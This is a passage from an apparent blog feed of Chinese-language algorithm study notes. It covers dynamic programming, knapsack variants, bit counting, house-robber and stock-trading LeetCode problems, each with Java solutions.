++)</span><br><span class="line">                <span class="comment">//将1进行左移相应的位数，就可以得到相关的掩码</span></span><br><span class="line">                masks[i] |= <span class="number">1</span> &lt;&lt; words[i].charAt(j) - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i ++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + <span class="number">1</span>; j &lt; n; j ++)</span><br><span class="line">                <span class="comment">//表示 i 和 j里没有重复的字符</span></span><br><span class="line">                <span class="keyword">if</span>((masks[i] &amp; masks[j]) == <span class="number">0</span>)</span><br><span class="line">                    ans = Math.max(words[i].length() * words[j].length(), ans);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>code</category>
        <category>算法</category>
      </categories>
      <tags>
        <tag>code</tag>
      </tags>
  </entry>
  <entry>
    <title>刷题-算法</title>
    <url>/2022/03/18/%E5%88%B7%E9%A2%98-%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="动态规划-dynamic-programming-DP"><a href="#动态规划-dynamic-programming-DP" class="headerlink" title="动态规划 dynamic programming [DP]"></a>动态规划 dynamic programming [DP]</h1><p><a href="https://blog.csdn.net/u013309870/article/details/75193592">https://blog.csdn.net/u013309870/article/details/75193592</a></p>
<p><font color = red><strong><u>动态规划在解题的时候一般不关心每一个结果是怎么构成的，怎么实现的，只用关心初始值和递推公式，因为这样就可以用程序来跑出结果</u></strong></font></p>
<p>适用于有重叠子问题和最优子结构性质的问题。</p>
<blockquote>
<p>最优子结构：如果问题的最优解所包含的子问题的解也是最优的。</p>
<p>无后效性：子问题的解一旦确定就不再更改。</p>
<p>子问题重叠性质：旨在使用递归算法自顶向下对问题进行求解的时候，每次产生的子问题并不总是新问题，有些子问题需要被重复计算多次。</p>
</blockquote>
<span id="more"></span>

<p>其思想：<u>先计算子问题，然后根据子问题得出原问题的解，所以需要存储子问题</u></p>
<p>思考动态规划的解题思路的时候一般用的是：**<u>从结果推出上一个子问题的答案，以此来推断出状态转移方程</u>**</p>
<p>动态规划算法有两种形式：</p>
<ul>
<li>自顶向下的备忘录法</li>
<li>自底向上</li>
</ul>
<p><strong>动态规划基本步骤：</strong></p>
<ol>
<li>确定dp数组（dp table）以及下标的含义</li>
<li>确定递推公式<ul>
<li>在这里可以根据题目给出的例子，来进行相关的递推，找出规律，从而确定递推公</li>
</ul>
</li>
<li>dp数组如何初始化</li>
<li>确定遍历顺序</li>
<li>举例推导dp数组</li>
</ol>
<p>动态规划经典案例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//动态规划节约空间，自第向上   </span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">jumpFloor</span><span class="params">(<span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="comment">//分步骤完成 ，用乘法</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">temp_1</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">temp_2</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=target;i++)&#123;</span><br><span class="line">            result = temp_1+temp_2;</span><br><span class="line">            temp_2 = temp_1;</span><br><span class="line">            temp_1 = result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result ;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//自底向上</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">jumpFloor</span><span class="params">(<span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="comment">//分步骤完成 ，用乘法</span></span><br><span class="line">        <span class="type">int</span> dp[] = <span class="keyword">new</span> <span class="title class_">int</span>[target+<span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=target;i++)&#123;</span><br><span class="line">            dp[i] = dp[i-<span class="number">1</span>]+dp[i-<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[target] ;      </span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//递归，存储中间值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;    </span><br><span class="line">    <span class="type">int</span> dp[] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">50</span>];    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">jumpFloor</span><span class="params">(<span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="comment">//分步骤完成 ，用乘法        </span></span><br><span class="line">        <span class="keyword">if</span>(target&lt;=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(dp[target]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> dp[target];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[target] = jumpFloor(target-<span class="number">1</span>)+jumpFloor(target-<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">jumpFloor</span><span class="params">(<span class="type">int</span> target)</span> &#123;      </span><br><span class="line">        <span class="keyword">if</span>(target&lt;=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> jumpFloor(target-<span class="number">1</span>)+jumpFloor(target-<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用<code>Brian Kernighan</code>算法，可以在一定程度上进一步提升计算速度。Brian Kernighan 算法的原理是：对于任意整数 x，令 x&#x3D;x&amp;(x-1)x，该运算将 xx 的二进制表示的最后一个 1 变成 0。因此，对 x 重复该操作，直到 x 变成 0，则操作次数即为 x 的「一比特数」<br><font color = red>正整数 y 是 2 的整数次幂，当且仅当 y&amp;(y-1)&#x3D;0</font></p>
<p>得到0-n的所有数据的bit的1的个数:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] countBits(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="type">int</span>[] bits = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">highBit</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((i &amp; (i - <span class="number">1</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//i是2的整数次幂，只有最高位为1，其余为0，在这里highbit表示的是bit[i]的最高有效位</span></span><br><span class="line">                highBit = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//bit[i]&gt;bit[j],i&gt;j&gt;0,并且i比j的二进制1多一个，</span></span><br><span class="line">            bits[i] = bits[i - highBit] + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bits;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] countBits(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="type">int</span>[] bits = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="comment">//i &amp; (i - 1):其结果是将最低位的1变为0</span></span><br><span class="line">            bits[i] = bits[i &amp; (i - <span class="number">1</span>)] + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bits;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="背包问题"><a href="#背包问题" class="headerlink" title="背包问题"></a>背包问题</h2><p><strong>在具体做题的时候，要分清楚，哪一个是物品，哪一个是背包，记住背包的大小和dp数组的尺寸息息相关</strong></p>
<h3 id="01背包问题"><a href="#01背包问题" class="headerlink" title="01背包问题"></a>01背包问题</h3><p>描述：每个物品的数量只有一个，每个物品指挥面临选或者不选。</p>
<p>在一维dp数组中，dp[j]表示：容量为j的背包，所背的物品价值可以最大为dp[j]。</p>
<p><strong>递推公式：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//填满背包有多少种方法</span></span><br><span class="line">dp[j] += dp[j - nums[i]];</span><br><span class="line"><span class="comment">//填满背包的最大价值</span></span><br><span class="line">dp[j] = max(dp[j], dp[j - weight[i]] + value[i]);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//递推关系式 前一次的dp[j]也就是不放现在的物品i的价值，dp[j - weight[i]] + value[i]表示的是放入物品i之后的背包的价值</span></span><br><span class="line">dp[j] = max(dp[j], dp[j - weight[i]] + value[i]);</span><br><span class="line"><span class="comment">//遍历方式，</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; weight.size(); i++) &#123; <span class="comment">// 遍历物品</span></span><br><span class="line">    <span class="comment">//每一轮循环表示的是，在容量为j的背包，放入物品i之后的最大价值</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> bagWeight; j &gt;= weight[i]; j--) &#123; <span class="comment">// 遍历背包容量</span></span><br><span class="line">    <span class="comment">//这里进行倒叙遍历是为了不让同一个物品放入多次</span></span><br><span class="line">        <span class="comment">//保证每一个物品只放入一次</span></span><br><span class="line">        dp[j] = max(dp[j], dp[j - weight[i]] + value[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://leetcode.cn/problems/ones-and-zeroes/">474. 一和零</a></p>
<p>两个维度的01背包问题</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findMaxForm</span><span class="params">(String[] strs, <span class="type">int</span> m, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="comment">//dp[i][j]表示的是最多有i个0，j个1的str的最大子集的长度</span></span><br><span class="line">        <span class="comment">//dp[i][j] = Math.max(dp[i][j],dp[i-zeroNum][j-oneNum] + 1);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">zeroNum</span> <span class="operator">=</span> <span class="number">0</span>,oneNum=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> [][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m+<span class="number">1</span>][n+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(String s:strs)&#123;</span><br><span class="line">            zeroNum = <span class="number">0</span>;</span><br><span class="line">            oneNum = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">//统计每一个字符串的0，1，个数</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;s.length();i++)&#123;</span><br><span class="line">                <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s.charAt(i);</span><br><span class="line">                <span class="keyword">if</span>(c==<span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">                    zeroNum++;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    oneNum++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//开始遍历背包，这里类似于滚动数组，需要从后向前进行遍历</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> m;i&gt;=zeroNum;i--)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> n;j&gt;=oneNum;j--)&#123;</span><br><span class="line">                    <span class="comment">//max(dp[i][j]不加上当前字符串,加上当前字符串之后的长度)</span></span><br><span class="line">                    dp[i][j] = Math.max(dp[i][j],dp[i-zeroNum][j-oneNum]+<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="完全背包问题"><a href="#完全背包问题" class="headerlink" title="完全背包问题"></a>完全背包问题</h2><ul>
<li>与01背包问题不同的是，完全背包问题每个物品有多个</li>
<li>01背包和完全背包唯一不同就是体现在遍历顺序上。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 先遍历物品，再遍历背包</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; weight.size(); i++) &#123; <span class="comment">// 遍历物品</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> weight[i]; j &lt;= bagWeight ; j++) &#123; <span class="comment">// 遍历背包容量</span></span><br><span class="line">        <span class="comment">//因为可以重复添加多次，所以，可以从前往后遍历背包的容量</span></span><br><span class="line">        dp[j] = max(dp[j], dp[j - weight[i]] + value[i]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//01背包问题的核心代码</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; weight.size(); i++) &#123; <span class="comment">// 遍历物品</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> bagWeight; j &gt;= weight[i]; j--) &#123; <span class="comment">// 遍历背包容量</span></span><br><span class="line">        <span class="comment">//为了避免重复添加相同的物品，所以这里是从后往前进行遍历</span></span><br><span class="line">        dp[j] = max(dp[j], dp[j - weight[i]] + value[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>如果求组合数就是外层for循环遍历物品，内层for遍历背包</strong>。</p>
<p><strong>如果求排列数就是外层for遍历背包，内层for循环遍历物品</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">这个就是排列问题</span></span><br><span class="line"><span class="comment">377. 组合总和 Ⅳ</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">combinationSum4</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="comment">//可以重复，所以就使用的是完全背包问题</span></span><br><span class="line">        <span class="comment">//dp[i]表示和为i的nums里面的所有组合数</span></span><br><span class="line">        <span class="type">int</span> [] dp = <span class="keyword">new</span> <span class="title class_">int</span> [target+<span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">       <span class="comment">//因为这里不同顺序也算是不同组合，所以是求排列，所以外层是遍历的是背包，内存遍历的是物品</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;j&lt;=target;j++)&#123;<span class="comment">//背包</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;<span class="comment">//物品</span></span><br><span class="line">                <span class="keyword">if</span>(j-nums[i]&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                    dp[j] += dp[j-nums[i]]; </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// for(int i = 0;i&lt;=target;i++)&#123;</span></span><br><span class="line">        <span class="comment">//     System.out.println(&quot;i:&quot;+i+&quot;\tdp[i]:&quot;+dp[i]);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="keyword">return</span> dp[target];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">这个就是组合数，不用对其进行排列</span></span><br><span class="line"><span class="comment">518. 零钱兑换 II</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">change</span><span class="params">(<span class="type">int</span> amount, <span class="type">int</span>[] coins)</span> &#123;</span><br><span class="line">        <span class="comment">//dp[j] 表示coins中总和为j的组合数</span></span><br><span class="line">        <span class="type">int</span> [] dp  = <span class="keyword">new</span> <span class="title class_">int</span> [amount+<span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;coins.length;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> coins[i];j&lt;=amount;j++)&#123;</span><br><span class="line">            <span class="comment">// for(int j = amount;j&gt;=coins[i];j--)&#123;</span></span><br><span class="line">                <span class="comment">//因为每一个硬币是可以重复计算的，所以应该需要的是从前往后</span></span><br><span class="line">                dp[j] += dp[j-coins[i]];</span><br><span class="line">                System.out.println(<span class="string">&quot;dp[j]:&quot;</span>+ j + <span class="string">&quot;\t&quot;</span>+dp[j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[amount];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>139.单词拆分</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">wordBreak</span><span class="params">(String s, List&lt;String&gt; wordDict)</span> &#123;</span><br><span class="line">        <span class="comment">//明显s是背包，字典是物品，问题就是问，物品能不能装满背包</span></span><br><span class="line">        <span class="comment">//dp[i]表示的是在容量大小为i的背包，是不是由 字典里面的单词组成</span></span><br><span class="line">        <span class="comment">//dp[i] = dp[i] || dp[i-j] &amp;&amp; (j,i)之间的字符串出现在字典中，则为true</span></span><br><span class="line">        <span class="type">boolean</span>[] dp = <span class="keyword">new</span> <span class="title class_">boolean</span> [s.length()+<span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;i&lt;=s.length();i++)&#123; <span class="comment">//遍历背包,背包容量就是i</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;j&lt;i;j++)&#123;<span class="comment">//遍历物品,物品是不能超过背包容量的</span></span><br><span class="line">                <span class="keyword">if</span>(dp[j]==<span class="literal">true</span>)&#123;</span><br><span class="line">                    <span class="comment">//因为只有dp[j]=true才有意义</span></span><br><span class="line">                    <span class="comment">//从背包中取出从j开始到i的字符串，如果这个字符串在字典里面，则说明dp[i] = true</span></span><br><span class="line">                    <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> s.substring(j,i);</span><br><span class="line">                    <span class="comment">// System.out.println(temp);</span></span><br><span class="line">                    <span class="keyword">if</span>(wordDict.contains(temp))&#123;</span><br><span class="line">                        dp[i] = <span class="literal">true</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[s.length()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="打家劫舍"><a href="#打家劫舍" class="headerlink" title="打家劫舍"></a>打家劫舍</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">rob</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="comment">//dp[i]表示的是到i间房为止，可以偷到的最大金额</span></span><br><span class="line">        <span class="comment">//dp[i]= max(不偷i的情况下，偷i的情况下)</span></span><br><span class="line">        <span class="comment">//dp[i]= Math.max(dp[i-1],dp[i-2]+nums[i]);</span></span><br><span class="line">        <span class="keyword">if</span>(nums.length==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[nums.length];</span><br><span class="line">        dp[<span class="number">0</span>] = nums[<span class="number">0</span>];</span><br><span class="line">        dp[<span class="number">1</span>] = Math.max(nums[<span class="number">0</span>],nums[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            dp[i] = Math.max(dp[i-<span class="number">1</span>],dp[i-<span class="number">2</span>]+nums[i]);</span><br><span class="line">            <span class="comment">// System.out.println(dp[i]);</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[nums.length-<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://leetcode.cn/problems/house-robber-iii/">337. 打家劫舍 III</a>：树形dp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//使用树形dp来解，就只是额外用了两个数组</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    HashMap&lt;TreeNode,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">rob</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> []result = robAction(root);</span><br><span class="line">        <span class="keyword">return</span> Math.max(result[<span class="number">0</span>],result[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] robAction(TreeNode root)&#123;</span><br><span class="line">        <span class="keyword">if</span>(root ==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> [] left = robAction(root.left);</span><br><span class="line">        <span class="type">int</span> [] right = robAction(root.right);</span><br><span class="line"></span><br><span class="line">         <span class="comment">//表示偷了当前节点，则孩子节点就不投了   </span></span><br><span class="line">        <span class="type">int</span> <span class="variable">result1</span> <span class="operator">=</span> root.val + left[<span class="number">0</span>] + right[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//如果不偷当前节点，则孩子节点可偷可不偷</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">result2</span> <span class="operator">=</span> Math.max(left[<span class="number">0</span>],left[<span class="number">1</span>]) + Math.max(right[<span class="number">0</span>],right[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;result2,result1&#125;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//使用暴力的方式来解，同时记录下中间过程来优化</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    HashMap&lt;TreeNode,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">rob</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.left==<span class="literal">null</span> &amp;&amp; root.right==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> root.val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(hashmap.containsKey(root))&#123;</span><br><span class="line">            <span class="keyword">return</span> hashmap.get(root);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//直接使用暴力的方式来解</span></span><br><span class="line">        <span class="comment">//1.打劫了父节点，则孩子节点不打劫</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">result1</span> <span class="operator">=</span> root.val;</span><br><span class="line">        <span class="keyword">if</span>(root.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">            result1 += rob(root.left.left) + rob(root.left.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">            result1 += rob(root.right.left) + rob(root.right.right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//2.不打劫父节点，则开始考虑孩子节点</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">result2</span> <span class="operator">=</span> rob(root.left) + rob(root.right);</span><br><span class="line">        hashmap.put(root,Math.max(result1,result2));</span><br><span class="line">        <span class="keyword">return</span> Math.max(result1,result2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="买卖股票-还要看看冷近期"><a href="#买卖股票-还要看看冷近期" class="headerlink" title="买卖股票 还要看看冷近期"></a>买卖股票 还要看看冷近期</h2><p>包含冷静期：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (prices == <span class="literal">null</span> || prices.length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[prices.length][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// bad case</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">//未持有股票,（昨天没有持有，或者昨天持有但是今天卖出了）</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">1</span>] = -prices[<span class="number">0</span>]; <span class="comment">//持有股票，买入股票后的钱, （昨天持有，昨天没有持有今天买入（今天买入的意思是，前天就要不持有股票））</span></span><br><span class="line">        dp[<span class="number">1</span>][<span class="number">0</span>] = Math.max(dp[<span class="number">0</span>][<span class="number">0</span>], dp[<span class="number">0</span>][<span class="number">1</span>] + prices[<span class="number">1</span>]);</span><br><span class="line">        dp[<span class="number">1</span>][<span class="number">1</span>] = Math.max(dp[<span class="number">0</span>][<span class="number">1</span>], -prices[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">            <span class="comment">// dp公式，没有持有 （前一天没有持有，前一天持有今天卖了）</span></span><br><span class="line">            <span class="comment">//今天卖股票</span></span><br><span class="line">            dp[i][<span class="number">0</span>] = Math.max(dp[i - <span class="number">1</span>][<span class="number">0</span>], dp[i - <span class="number">1</span>][<span class="number">1</span>] + prices[i]);</span><br><span class="line">            <span class="comment">//持有 = 